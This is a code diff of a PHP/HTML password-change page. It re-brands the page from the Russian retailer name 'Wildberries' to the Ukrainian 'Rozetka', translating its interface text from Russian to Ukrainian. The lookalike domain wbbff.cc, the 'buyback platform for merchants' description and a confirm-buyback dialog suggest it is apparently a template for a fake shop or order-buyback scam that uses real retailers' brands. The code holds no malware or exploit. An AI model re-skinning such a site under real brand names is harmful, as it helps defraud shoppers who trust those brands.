@@ -6,11 +6,11 @@
 }</style>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-<title>изменить войти пароль - Wildberries</title>
-<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+<title>змінити пароль входу - Rozetka</title>
+<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 <meta name="format-detection" content="telephone=no">
-<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 <link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
 <script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
 <script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
@@ -18,15 +18,15 @@
 <link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss"></head>
 <body><div class="pagetop">
 	<div class="fh"><a href="<?php echo route("settings") ?>"></a></div>
-	<div>изменить войти пароль</div>
+	<div>змінити пароль входу</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 	<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> --></div>
@@ -34,16 +34,16 @@
 	<form method="post" id="form">
 	<div class="zc_box2">
 				<div class="zc_list">
-			<div class="zc_name">шаг 1</div>
-			<div class="zc_text"><input type="password" name="user_oldpw" placeholder="Текущий пароль"></div>
+			<div class="zc_name">крок 1</div>
+			<div class="zc_text"><input type="password" name="user_oldpw" placeholder="Поточний пароль"></div>
 		</div>
 				<div class="zc_list">
-			<div class="zc_name">шаг 2</div>
-			<div class="zc_text"><input type="password" name="user_pw" placeholder="Новый пароль"></div>
+			<div class="zc_name">крок 2</div>
+			<div class="zc_text"><input type="password" name="user_pw" placeholder="Новий пароль"></div>
 		</div>
 		<div class="zc_list">
-			<div class="zc_name">шаг 3</div>
-			<div class="zc_text"><input type="password" name="user_pw1" placeholder="Подтвердите новый пароль"></div>
+			<div class="zc_name">крок 3</div>
+			<div class="zc_text"><input type="password" name="user_pw1" placeholder="Підтвердіть новий пароль"></div>
 		</div>
 	</div>
 	<div class="loginbtn" style="margin:20px 10px;">
@@ -57,11 +57,11 @@
 $(function(){
 	$(":button").click(function(){
 		if ($(":input[name='user_oldpw']").val().length == 0) {
-			app_tip("Введите старый пароль");
+			app_tip("Введіть старий пароль");
 			return false;
 		}
 		if ($(":input[name='user_pw']").val().length < 6 || $(":input[name='user_pw']").val().length > 20) {
-			app_tip("Новый пароль должен состоять из 6-20 символов.");
+			app_tip("Новий пароль повинен складатися з 6-20 символів.");
 			return false;
 		}
 		if ($(":input[name='user_pw1']").val().length < 6 || $(":input[name='user_pw1']").val().length > 20) {
@@ -69,7 +69,7 @@ $(function(){
 			return false;
 		}
 		if ($(":input[name='user_pw']").val() != $(":input[name='user_pw1']").val()) {
-			app_tip("Новый пароль не соответствует подтвержденному паролю.");
+			app_tip("Новий пароль не відповідає підтвердженому паролю.");
 			return false;
 		}
 		app_submit("<?php echo route("api.profile.change_password")?>", function(json){
@@ -84,7 +84,7 @@ $(function(){
 <script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
 <script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
 <script type="text/javascript">
-//顶部菜单点击
+//верхнє меню клік
 function top_menu() {
 	if ($("#top_menu").is(":hidden")) {
 		$("#top_menu").show();
@@ -101,8 +101,8 @@ pe_loadscript("https://wbbff.cc/api.php?mod=cron");
 <script>
 function confirm_huigou(order_id){
     layer.open({
-		content: "Определить выкуп этого Заказ？",
-		btn: ["OK", "Отмена"],
+		content: "Визначити викуп цього Замовлення？",
+		btn: ["OK", "Скасувати"],
 		shadeClose: false,
 		yes: function() {
 		    
